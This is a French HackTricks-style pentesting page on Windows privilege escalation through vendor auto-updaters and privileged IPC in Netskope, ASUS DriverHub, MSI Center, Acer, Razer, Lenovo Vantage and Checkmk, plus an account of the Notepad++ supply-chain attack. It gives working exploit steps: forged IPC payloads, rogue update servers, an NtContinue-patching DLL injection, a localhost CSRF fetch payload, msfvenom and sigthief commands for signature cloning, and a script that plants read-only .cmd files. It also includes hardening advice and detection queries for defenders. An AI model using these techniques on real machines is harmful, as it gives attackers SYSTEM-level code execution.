# Abuser des auto-updaters d’entreprise et de l’IPC privilégié (par ex., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes d’élévation de privilèges locales Windows découvertes dans des agents endpoint et des updaters d’entreprise qui exposent une surface IPC facilement exploitable et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur disposant de faibles privilèges peut forcer l’enrôlement vers un serveur contrôlé par l’attaquant, puis envoyer un MSI malveillant que le service SYSTEM installe.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Idées clés réutilisables contre des produits similaires :
- Abuser de l’IPC localhost d’un service privilégié pour forcer un nouvel enrôlement ou une reconfiguration vers un serveur contrôlé par l’attaquant.
- Implémenter les endpoints de mise à jour du fournisseur, fournir un Trusted Root CA malveillant et diriger l’updater vers un package malveillant, « signé ».
- Contourner les vérifications faibles du signataire (listes d’autorisation CN), les indicateurs de digest optionnels et les propriétés MSI permissives.
- Si l’IPC est « chiffré », dériver la clé/IV à partir d’identifiants machine lisibles par tous et stockés dans le registre.
- Si le service restreint les appelants selon le chemin de l’image ou le nom du processus, injecter du code dans un processus autorisé ou en lancer un en état suspendu, puis charger votre DLL via une modification minimale du contexte d’un thread.

---
## 1) Forcer l’enrôlement vers un serveur contrôlé par l’attaquant via l’IPC localhost

De nombreux agents incluent un processus UI en mode utilisateur qui communique avec un service SYSTEM via TCP localhost en utilisant JSON.

Observé dans Netskope :
- UI : stAgentUI (low integrity) ↔ Service : stAgentSvc (SYSTEM)
- ID de commande IPC 148 : IDP_USER_PROVISIONING_WITH_TOKEN

Flux d’exploitation :
1) Créer un token JWT d’enrôlement dont les claims contrôlent l’hôte backend (par ex., AddonUrl). Utiliser alg=None afin qu’aucune signature ne soit requise.
2) Envoyer le message IPC invoquant la commande de provisioning avec votre JWT et le nom du tenant :
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à contacter votre serveur rogue pour l’enrollment/la configuration, par exemple :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes :
- Si la vérification de l’appelant repose sur le chemin ou le nom, faites partir la requête d’un binaire vendor autorisé (voir §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Détournement du canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client communique avec votre serveur, implémentez les endpoints attendus et redirigez-le vers un MSI contrôlé par l’attaquant. Séquence typique :

1) /v2/config/org/clientconfig → Retournez une configuration JSON avec un intervalle d’update très court, par exemple :
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA au format PEM. Le service l’installe dans le magasin Local Machine Trusted Root.
3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une fausse version.

Contournement des vérifications courantes observées dans la nature :
- allow-list du CN du signataire : le service peut uniquement vérifier que le CN du Subject est égal à « netSkope Inc » ou « Netskope, Inc. ». Votre rogue CA peut émettre un certificat leaf avec ce CN et signer le MSI.
- propriété CERT_DIGEST : inclure une propriété MSI inoffensive nommée CERT_DIGEST. Aucune enforcement lors de l’installation.
- enforcement optionnel du digest : un config flag (par ex. check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
et exécute du code arbitraire en tant que NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Leçon concernant le patch-bypass : si un vendor réagit en ajoutant une petite liste de domaines « trusted » au lieu d’authentifier cryptographiquement la source de l’update, recherchez des redirectors ou reverse proxies appartenant au vendor qui permettent toujours de rediriger le trafic. Dans le cas de Netskope, des recherches publiques ultérieures ont montré qu’une allow-list datant de l’ère R129 pouvait toujours être exploitée via `rproxy.goskope.com`, qui proxyfiait du contenu Azure App Service contrôlé par l’attaquant. Considérez les allow-lists de hostnames comme un simple ralentissement, et non comme une trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Forging de requêtes IPC chiffrées (lorsqu’il est présent)

À partir de R127, Netskope a encapsulé le JSON IPC dans un champ encryptData qui ressemble à du Base64. Le reversing a montré l’utilisation d’AES, avec une key/IV dérivée de valeurs du registry lisibles par n’importe quel user :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attackers peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un standard user.<sup>[[1]](#references)[[2]](#references)</sup> Conseil général : si un agent commence soudainement à « chiffrer » son IPC, recherchez les device IDs, product GUIDs et install IDs sous HKLM utilisés comme matériel cryptographique.

---
## 4) Contourner les allow-lists des callers IPC (vérifications de chemin/nom)

Certains services tentent d’authentifier le peer en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l’image à des vendor binaries présents dans une allow-list sous Program Files (par ex. stagentui.exe, bwansvc.exe, epdlp.exe).

Deux bypasses pratiques :
- DLL injection dans un process présent dans l’allow-list (par ex. nsdiag.exe), puis proxyfier l’IPC depuis celui-ci.
- Lancer un binary présent dans l’allow-list en mode suspended et bootstrapper votre proxy DLL sans CreateRemoteThread (voir §5) afin de satisfaire les règles anti-tamper imposées par le driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatible avec la tamper-protection : process suspended + patch NtContinue

Les produits intègrent souvent un driver minifilter/OB callbacks (par ex. Stadrv) afin de retirer les droits dangereux des handles vers les protected processes :
- Process : supprime PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : limite à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un user-mode loader fiable qui respecte ces contraintes :
1) CreateProcess d’un binary vendor avec CREATE_SUSPENDED.
2) Obtenir les handles auxquels vous avez encore accès : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le process, ainsi qu’un thread handle avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou simplement THREAD_RESUME si vous patchez le code à un RIP connu).
3) Écraser ntdll!NtContinue (ou un autre thunk précoce et garanti comme étant mappé) avec un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis revient à l’adresse d’origine.
4) ResumeThread pour déclencher votre stub in-process et charger votre DLL.

Comme vous n’avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un process déjà protégé (vous l’avez créé), la policy du driver est respectée.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Tooling pratique
- NachoVPN (plugin Netskope) automatise la création d’un rogue CA, la signature d’un MSI malveillant et le service des endpoints requis : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope est un custom IPC client qui forge des messages IPC arbitraires (éventuellement chiffrés avec AES) et inclut l’injection dans un process suspended afin d’émettre les messages depuis un binary présent dans l’allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow de triage rapide pour les surfaces updater/IPC inconnues

Face à un nouvel endpoint agent ou à une suite de « helpers » de motherboard, un workflow rapide suffit généralement à déterminer si vous êtes face à une cible de privesc prometteuse :<sup>[[6]](#references)</sup>

1) Énumérer les listeners loopback et les relier aux vendor processes :
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Énumérer les named pipes candidates :
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraire les données de routage reposant sur le registre, utilisées par les serveurs IPC basés sur des plugins :
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrayez d’abord les noms des endpoints, les clés JSON et les identifiants de commande depuis le client en mode utilisateur. Les frontends Electron/.NET packagés révèlent fréquemment l’intégralité du schéma :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Recherchez le prédicat de confiance réel, et pas seulement le chemin de code qui lance finalement le processus :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Points à prioriser :
- `CryptQueryObject`/l’analyse de certificats sans `WinVerifyTrust` signifie généralement que « le certificat existe » a été considéré comme « le certificat est approuvé », ce qui permet le clonage de certificats ou d’autres techniques de faux signataire.
- Les vérifications par sous-chaîne ou suffixe sur `Origin`, `Referer`, les download URLs, les noms de processus ou les CN des signataires ne constituent pas une authentification. `contains(".vendor.com")` est généralement exploitable avec des domaines similaires contrôlés par l’attaquant.
- Si l’interface graphique avec peu de privilèges décide que « le fichier est approuvé » et que le broker SYSTEM se contente de consommer ce résultat, patcher ou réimplémenter la DLL/JS côté client permet souvent de contourner entièrement la boundary (split validation de type Razer).
- Si le broker copie un payload vers `%TEMP%`/`C:\Windows\Temp`, puis le valide ou le planifie depuis ce chemin, testez immédiatement les fenêtres de remplacement TOCTOU ainsi que les modules de plugins voisins qui exposent d’autres wrappers `ExecuteTask()` avec des vérifications plus faibles.<sup>[[6]](#references)</sup>

Pour les cibles utilisant beaucoup de named pipes, PipeViewer permet d’identifier rapidement les DACL faibles et les pipes accessibles à distance avant de commencer à reverse le protocole en profondeur.<sup>[[11]](#references)</sup>

Si la cible authentifie les callers uniquement par PID, chemin de l’image ou nom du processus, considérez cela comme un simple ralentissement plutôt que comme une boundary : injecter du code dans le client légitime ou établir la connexion depuis un processus allow-listé suffit souvent à satisfaire les vérifications du serveur. Pour les named pipes en particulier, [cette page sur l’impersonation de clients et l’abus des pipes](named-pipe-client-impersonation.md) présente la primitive plus en détail.

---
## 8) Brokers d’add-ins modulaires authentifiés uniquement par les signatures du vendor (pattern Lenovo Vantage)

Une variation plus récente à rechercher est le **signed-client RPC broker** : un processus desktop Lenovo signé et disposant de peu de privilèges communique avec un service SYSTEM, et le service route des commandes JSON vers un ensemble d’add-ins décrits en XML sous `%ProgramData%`. Dès qu’une exécution de code est obtenue **dans n’importe quel signed client accepté**, chaque contrat `runas="system"` fait partie de votre attack surface.<sup>[[15]](#references)</sup>

Primitives à forte valeur observées lors de recherches sur Lenovo Vantage :
- **Faire confiance au caller parce qu’il est signé par le vendor** : des chercheurs ont obtenu un contexte authentifié en copiant un EXE signé par Lenovo dans un répertoire accessible en écriture et en satisfaisant un DLL side-load (`profapi.dll`), de sorte qu’un code arbitraire s’exécute dans un client déjà approuvé par le service.
- **Découverte de l’attack surface pilotée par les manifests** : les add-ins sont déclarés sous `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` ; plusieurs contrats s’exécutent en tant que `SYSTEM`, donc l’énumération de ces manifests révèle souvent les verbes privilégiés réels plus rapidement que le reverse du broker lui-même.
- **Bugs par commande derrière le canal authentifié** : une fois à l’intérieur du client approuvé, des recherches publiques ont révélé des path traversal + race conditions dans les verbes de mise à jour/installation, de l’abus de raw SQL dans des bases de données de paramètres privilégiées et des vérifications de chemins de registre basées sur des sous-chaînes qui permettaient des écritures en dehors de la hive prévue.

Recon utile sur une cible :
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
À retenir : lorsqu’une suite d’assistants expose un broker qui authentifie d’abord le **processus appelant**, puis distribue les requêtes vers des dizaines de commandes de plugin/add-in, ne vous arrêtez pas après avoir contourné le contrôle de confiance initial. Extrayez la table du manifeste/contrat et fuzz each high-privilege verb independently ; le canal authentifié dissimule généralement plusieurs failles de seconde étape.

---
## 1) CSRF browser-to-localhost contre des APIs HTTP privilégiées (ASUS DriverHub)

DriverHub fournit un service HTTP en mode utilisateur (ADU.exe) sur 127.0.0.1:53000 qui attend des appels du navigateur provenant de https://driverhub.asus.com. Le filtre d’origine effectue simplement un `string_contains(".asus.com")` sur l’en-tête Origin et sur les URLs de téléchargement exposées par `/asus/v1.0/*`. N’importe quel host contrôlé par un attaquant, tel que `https://driverhub.asus.com.attacker.tld`, passe donc le contrôle et peut envoyer des requêtes modifiant l’état depuis JavaScript.<sup>[[6]](#references)</sup> Consultez [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) pour découvrir d’autres méthodes de contournement.

Déroulement pratique :
1) Enregistrez un domaine qui intègre `.asus.com` et hébergez-y une page web malveillante.
2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (par exemple `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyez le corps JSON attendu par le handler – le JavaScript frontend packagé présente le schéma ci-dessous.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Même la CLI PowerShell présentée ci-dessous réussit lorsque l’en-tête Origin est spoofé avec la valeur approuvée :
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Toute visite du navigateur sur le site de l’attaquant devient donc un CSRF local en 1 clic (ou en 0 clic via `onload`) qui pilote un helper SYSTEM.

---
## 2) Vérification de code-signing non sécurisée et clonage de certificat (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de sous-chaîne : `http://updates.asus.com.attacker.tld:8000/payload.exe` est donc accepté. Après le téléchargement, ADU.exe vérifie simplement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter — aucun `WinVerifyTrust`, aucune validation de chaîne.

Pour weaponize le flow :
1) Créer un payload (par exemple, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Cloner le signer ASUS dans celui-ci (par exemple, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Héberger `pwn.exe` sur un domaine ressemblant à `.asus.com` et déclencher UpdateApp via le browser CSRF ci-dessus.

Comme les filtres Origin et URL sont tous deux basés sur des sous-chaînes et que la vérification du signer ne compare que des chaînes, DriverHub télécharge et exécute le binaire de l’attaquant dans son contexte privilégié.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU dans les chemins de copie/exécution de l’updater (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque frame est composée de `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
1) Copie l’exécutable fourni vers `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le subject du certificat doit être égal à “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une scheduled task qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer la Frame A en indiquant un binaire légitime signé par MSI (ce qui garantit la réussite de la vérification de signature et la mise en file de la task).
- Entrer en race avec des messages Frame B répétés qui indiquent un payload malveillant et écrasent `MSI Center SDK.exe` juste après la fin de la vérification.

Lorsque le scheduler se déclenche, il exécute le payload écrasé sous SYSTEM, bien qu’il ait validé le fichier original. Une exploitation fiable utilise deux goroutines/threads qui envoient CMD_AutoUpdateSDK en boucle jusqu’à gagner la fenêtre TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abus d’IPC personnalisé au niveau SYSTEM et de l’impersonation (MSI Center + Acer Control Centre)

### Ensembles de commandes TCP de MSI Center
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d’une frame sélectionnent ce composant, ce qui permet aux attaquants de router des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` sans aucune validation de signature — n’importe quel utilisateur local peut lui indiquer `C:\Users\<user>\Desktop\payload.exe` et obtenir de manière déterministe une exécution SYSTEM.
- Sniffer le loopback avec Wireshark ou instrumenter les binaires .NET dans dnSpy révèle rapidement le mapping Component ↔ command ; des clients custom en Go/Python peuvent ensuite rejouer les frames.<sup>[[6]](#references)</sup>

### Named pipes d’Acer Control Centre et niveaux d’impersonation
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et sa discretionary ACL autorise les clients distants (par exemple, `\\TARGET\pipe\treadstone_service_LightMode`). L’envoi de l’ID de commande `7` avec un chemin de fichier invoque la routine de création de processus du service.
- La client library sérialise un octet terminateur magic (113) avec les arguments. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif mappe cette valeur vers un `SECURITY_IMPERSONATION_LEVEL` et un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) fait passer dans la branche générique qui conserve le token SYSTEM complet et définit un SID de haute intégrité (`S-1-16-12288`). Le binaire créé s’exécute donc en tant que SYSTEM sans restriction, aussi bien localement que sur une autre machine.
- Combiner cela avec le flag d’installer exposé (`Setup.exe -nocheck`) pour démarrer ACC même sur des VM de lab et utiliser le pipe sans matériel du vendor.<sup>[[6]](#references)</sup>

Ces bugs d’IPC montrent pourquoi les services localhost doivent appliquer une authentification mutuelle (SIDs ALPC, filtres `ImpersonationLevel=Impersonation`, filtrage des tokens) et pourquoi chaque helper de module permettant de “run arbitrary binary” doit utiliser les mêmes vérifications de signer.

---
## 3) Helpers “elevator” COM/IPC reposant sur une validation faible en user mode (Razer Synapse 4)

Razer Synapse 4 a ajouté un autre pattern utile à cette famille : un utilisateur faiblement privilégié peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL en user mode (`simple_service.dll`) au lieu d’être appliquée de manière robuste à l’intérieur de la boundary privilégiée.

Chemin d’exploitation observé :
- Instancier l’objet COM `RzUtility.Elevator`.
- Appeler `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement privilégié.
- Dans le PoC public, le gate de signature PE dans `simple_service.dll` est patché avant l’envoi de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.<sup>[[6]](#references)[[10]](#references)</sup>

Invocation PowerShell minimale :
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Conclusion générale : lors de l’analyse inverse de suites « helper », ne vous limitez pas au TCP localhost ou aux named pipes. Vérifiez la présence de classes COM portant des noms tels que `Elevator`, `Launcher`, `Updater` ou `Utility`, puis déterminez si le service privilégié valide réellement le binaire cible ou s’il fait simplement confiance à un résultat calculé par une DLL cliente en user-mode pouvant être patchée. Ce modèle se généralise au-delà de Razer : toute architecture séparée dans laquelle le broker disposant de privilèges élevés consomme une décision allow/deny provenant de la partie à faibles privilèges constitue une surface potentielle de privesc.

---
## Exécution prévisible d’un script temporaire pendant la réparation MSI (Checkmk Agent / CVE-2024-0670)

Certains agents Windows implémentent encore des actions privilégiées en écrivant un fichier `.cmd` temporaire dans `C:\Windows\Temp`, puis en l’exécutant en tant que `SYSTEM`. Si le nom de fichier est prévisible et que le service ne recrée pas correctement les fichiers existants, un utilisateur disposant de faibles privilèges peut précréer le futur fichier temporaire en **lecture seule** et forcer le processus privilégié à exécuter un contenu contrôlé par l’attaquant au lieu de son propre script.

Observé dans les builds vulnérables de Checkmk Agent :
- motif temporaire : `cmk_all_<PID>_1.cmd`
- branches affectées : `2.0.0`, `2.1.0`, `2.2.0`
- déclencheur : **réparation** MSI du package agent mis en cache<sup>[[8]](#references)[[9]](#references)</sup>

Workflow pratique :
1. Estimez une plage réaliste de PID à partir des ID des processus actuels ou du PID de l’agent en cours d’exécution.
2. Écrivez un payload `.cmd` court en **ASCII** (`Set-Content -Encoding Ascii` ou redirection `cmd.exe` ; évitez la sortie PowerShell en UTF-16 pour les fichiers batch).
3. Déployez `C:\Windows\Temp\cmk_all_<PID>_1.cmd` sur toute la plage candidate et marquez chaque fichier en lecture seule.
4. Déclenchez une réparation du MSI mis en cache afin que le service privilégié tente de régénérer puis exécute le script temporaire.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Si le produit vulnérable est installé avec Windows Installer, associez le fichier MSI en cache à l’apparence aléatoire situé sous `C:\Windows\Installer` à son nom de produit avant de déclencher la réparation :<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Notes opérationnelles :
- `qwinsta` est utile lorsque `msiexec /fa` échoue depuis un shell WinRM non interactif et que vous devez déterminer si une session de bureau existante ou déconnectée peut déclencher correctement la réparation.<sup>[[7]](#references)</sup>
- Ce modèle se généralise à d’autres agents endpoint et updaters qui **placent des scripts temporaires dans des emplacements accessibles en écriture par tous, puis les exécutent en tant que SYSTEM**. Testez les noms prévisibles, l’absence de mécanismes de création exclusive et les flux de réparation/mise à jour pouvant être déclenchés à la demande.

---
## Détournement de la supply chain à distance via une validation faible de l’updater (WinGUp / Notepad++)

Entre juin 2025 et décembre 2025, des attaquants ayant compromis l’infrastructure d’hébergement derrière le flux de mise à jour de Notepad++ ont servi sélectivement des manifests malveillants à certaines victimes. Les updaters plus anciens basés sur WinGUp ne vérifiaient pas complètement l’authenticité des mises à jour ; une réponse XML hostile pouvait donc rediriger les clients vers des URLs contrôlées par les attaquants. Comme le client acceptait le contenu HTTPS sans imposer à la fois une chaîne de certificats de confiance et une signature PE valide sur l’installeur téléchargé, les victimes récupéraient puis exécutaient un `update.exe` NSIS trojanisé.<sup>[[12]](#references)[[13]](#references)</sup>

Flux opérationnel (aucun exploit local requis) :
1. **Interception de l’infrastructure** : compromettre le CDN/l’hébergement et répondre aux vérifications de mise à jour avec des métadonnées d’attaquant pointant vers une URL de téléchargement malveillante.
2. **NSIS trojanisé** : l’installeur récupère/exécute un payload et abuse de deux chaînes d’exécution :
- **Bring-your-own signed binary + sideload** : intégrer le `BluetoothService.exe` signé de Bitdefender et déposer une `log.dll` malveillante dans son chemin de recherche. Lorsque le binaire signé s’exécute, Windows effectue un sideload de `log.dll`, qui déchiffre puis charge de manière reflective la backdoor Chrysalis (protégée par Warbird + hachage des API pour compliquer la détection statique).
- **Injection de shellcode scriptée** : NSIS exécute un script Lua compilé qui utilise des API Win32 (par exemple `EnumWindowStationsW`) pour injecter du shellcode et déployer Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Points clés de hardening/détection pour tout auto-updater :
- Imposer la **vérification du certificat + de la signature** de l’installeur téléchargé (épingler le signataire du fournisseur, rejeter les CN/chaînes non correspondants) et signer le manifest de mise à jour lui-même (par exemple avec XMLDSig). Bloquer les redirections contrôlées par le manifest tant qu’elles n’ont pas été validées.
- Traiter le **BYO signed binary sideloading** comme un pivot de détection post-téléchargement : déclencher une alerte lorsqu’un EXE signé d’un fournisseur charge un nom de DLL situé en dehors de son chemin d’installation canonique (par exemple Bitdefender chargeant `log.dll` depuis Temp/Downloads), ainsi que lorsqu’un updater dépose/exécute des installeurs depuis un emplacement temporaire avec des signatures qui ne sont pas celles du fournisseur.
- Surveiller les artefacts **spécifiques au malware** observés dans cette chaîne (utiles comme pivots génériques) : le mutex `Global\Jdhfv_1.0.1`, les écritures anormales de `gup.exe` dans `%TEMP%` et les étapes d’injection de shellcode pilotées par Lua.
- Notepad++ a renforcé WinGUp dans la version v8.8.9 et les versions ultérieures : le XML renvoyé est désormais signé (XMLDSig), et les builds plus récents imposent la vérification du certificat + de la signature de l’installeur téléchargé au lieu de faire confiance uniquement au transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading d’un EXE signé par Bitdefender chargeant <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un installateur autre que Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ces modèles se généralisent à tout updater qui accepte des manifests non signés ou qui ne vérifie pas l'identité des signers de l'installer : network hijack + malicious installer + sideloading signé avec ses propres certificats permettent une remote code execution sous couvert de mises à jour « trusted ».

---
## Références
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
